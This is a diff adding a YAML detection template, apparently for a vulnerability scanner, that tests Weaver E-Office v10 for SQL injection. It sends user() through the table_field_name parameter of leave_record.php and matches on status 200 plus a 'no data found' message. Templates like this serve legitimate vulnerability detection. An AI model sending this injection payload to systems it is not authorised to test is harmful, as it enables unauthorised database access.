@@ -1,0 +1,13 @@
+name: 泛微-EOffice-v10-sql-inject
+description: >
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1&table_field=1&table_field_name=user()&max_rows=10
+    follow_redirects: false
+    expression:
+      status: 200
+      body_all:
+        - "未找到相关数据"
